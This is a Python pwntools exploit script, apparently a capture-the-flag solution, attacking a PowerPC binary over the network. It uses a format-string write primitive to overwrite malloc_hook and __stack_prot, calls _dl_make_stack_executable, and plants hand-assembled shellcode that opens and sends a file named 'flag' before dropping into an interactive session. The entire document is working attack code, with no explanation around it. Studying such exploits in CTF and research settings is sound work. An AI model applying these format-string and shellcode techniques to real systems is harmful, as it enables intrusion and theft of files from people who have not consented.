from pwn import *
from fmt_attack import Payload

# p = process(['qemu-ppc','./pwn22'])
p = remote('192.168.199.172',23333)
#context.log_level = 'debug'
context.arch = 'powerpc'

def small2big(a):
    return u32(p32(a),endian='big')
a = Payload(13 + 3,addon=('%' + str(0x1009FF80-0x20) + 'x').ljust(12,'b'))
def add_big_endian(value,addr):
    global a
    a.add_write_chunk(value >> 16,small2big(addr),write_len=2)
    a.add_write_chunk(value & 0xffff,small2big(addr + 2),write_len=2)

add_big_endian(0x10067140,0x100A0E10) # malloc_hook
# add_big_endian(0x100A1000,0x1009FF80) # libc_stack
a.add_write_chunk(7,small2big(0x1009FF88),write_len=4,is_raw_length=True) # __stack_prot
'''
dl_make_stack_exec
'''
add_big_endian(0x10053D70,0x1009FB00)  # _dl_make_stack_executable
add_big_endian(0x100A1000,0x1009FAFC)
add_big_endian(u32('flag',endian='big'),0x100a0000)

add_big_endian(u32(asm('lis r3,0x100a')),0x100A1000)
add_big_endian(u32(asm('li r0,5')),0x100A1000 + 4)
add_big_endian(u32(asm('li r4,0')),0x100A1000 + 8)
add_big_endian(u32(asm('sc')),0x100A1000 + 12)

add_big_endian(u32(asm('li r5,0')),0x100A1000 + 16)
add_big_endian(u32(asm('mr r4,r3')),0x100A1000 + 20)
add_big_endian(u32(asm('li r3,1')),0x100A1000 + 24)
add_big_endian(u32(asm('li r0,186')),0x100A1000 + 28)
add_big_endian(u32(asm('li r6,0x100')),0x100A1000 + 32)
add_big_endian(u32(asm('sc')),0x100A1000 + 36)

# add_big_endian(u32(asm('li r5,0x100')),0x100A1000 + 16)
# add_big_endian(u32(asm('lis r4,0x100a')),0x100A1000 + 20)
# add_big_endian(u32(asm('li r0,3')),0x100A1000 + 24)
# add_big_endian(u32(asm('sc')),0x100A1000 + 28)
# add_big_endian(u32(asm('li r0,4')),0x100A1000 + 32)
# add_big_endian(u32(asm('li r3,1')),0x100A1000 + 36)
# add_big_endian(u32(asm('li r5,0x100')),0x100A1000 + 40)
# add_big_endian(u32(asm('lis r4,0x100a')),0x100A1000 + 44)
# add_big_endian(u32(asm('sc')),0x100A1000 + 48)

payload = a.get_payload()
print(len(payload))
p.send(payload)
# p.recvuntil('n1ctf')
p.interactive()

